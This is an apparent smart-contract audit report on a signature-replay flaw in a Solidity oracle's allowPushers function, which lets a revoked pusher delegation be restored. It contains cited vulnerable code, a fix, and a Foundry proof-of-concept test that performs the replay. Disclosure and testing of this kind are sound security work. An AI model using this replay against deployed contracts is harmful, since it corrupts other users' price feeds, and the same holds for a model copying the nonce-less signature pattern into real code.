### Title
`allowPushers` delegation consent signature can be replayed within the deadline window to re-establish a revoked pusher delegation — (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

### Summary
`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 consent signature but neither tracks used signatures nor includes a per-pusher nonce. The only replay barrier is the deadline. After a pusher self-revokes via `revokePusher`, the namespace creator can call `allowPushers` again with the identical signature (provided the deadline has not yet expired) to silently re-establish the delegation. This is the direct analog of the AllowList replay class from the external report: a revocation that should be permanent can be undone by replaying the original consent.

### Finding Description
`allowPushers` constructs the signed digest as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no nonce, no per-pusher sequence counter, and no `usedSignatures` mapping. The only protection against replay is `_ensureDeadline`, which checks `block.timestamp <= deadline`. [2](#0-1) 

Once the pusher calls `revokePusher()`, which sets `namespaceRemapping[pusher] = address(0)`: [3](#0-2) 

…the creator still holds the original signature bytes. If the deadline has not expired, the creator calls `allowPushers` again with the same `(deadline, pushers, signatures)` arguments. Both the `_ensureDeadline` check and the ECDSA recovery check pass, and `namespaceRemapping[pusher] = msg.sender` is written again — exactly reversing the revocation.

The code's own comment acknowledges the deadline is the sole replay barrier: *"the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it"* — but a dated signature with a future deadline is equally replayable within that window. [4](#0-3) 

### Impact Explanation
After re-delegation, every subsequent `fallback()` push from the pusher's address is routed to the creator's namespace instead of the pusher's own namespace: [5](#0-4) 

If the pusher had begun pushing into their own namespace to serve their own pool after revoking, those writes are silently redirected to the creator's namespace. The pusher's own pool then reads a stale (never-updated) feed — timestamp = 0, which every consumer rejects as stale — causing bad-price execution or a complete halt of swaps on that pool. The creator's pool simultaneously receives oracle data it was not supposed to receive after the pusher's revocation, enabling oracle data injection into a live pool's price feed without the pusher's ongoing consent.

### Likelihood Explanation
The creator retains the pusher's consent signature after the initial `allowPushers` call. Any creator who wishes to prevent a pusher from operating independently after revocation can replay the signature at any time before the deadline. Deadlines are set by the caller and can be arbitrarily far in the future. The replay requires no privileged keys — only the creator's EOA and the stored signature bytes. The pusher has no on-chain mechanism to invalidate the old signature short of waiting for the deadline to expire.

### Recommendation
Add a per-pusher nonce to the signed message and increment it on each successful delegation:

```solidity
mapping(address pusher => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]++
    ))
);
```

Alternatively, maintain a `mapping(bytes32 => bool) usedSignatures` and mark each digest as consumed after first use, preventing any signature from being accepted more than once regardless of deadline.

### Proof of Concept
```solidity
function test_allowPushers_replayAfterRevoke() public {
    uint256 deadline = block.timestamp + 365 days;

    // 1. Pusher signs consent for creator
    bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers_ = new address[](1);
    pushers_[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator delegates pusher
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers_, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes — intends to push into own namespace
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the SAME signature — revocation is silently undone
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers_, sigs); // succeeds, no revert
    assertEq(oracle.namespaceRemapping(pusher), creator); // delegation restored

    // 5. Pusher's subsequent pushes land in creator's namespace, not their own
    //    Pusher's own pool now reads stale data (timestamp=0) → bad-price execution
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(1_000_000, 2, 2);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);
    // Push landed in creator's namespace
    assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0);
    // Pusher's own namespace is empty/stale — their pool is broken
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L314-321)
```text

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
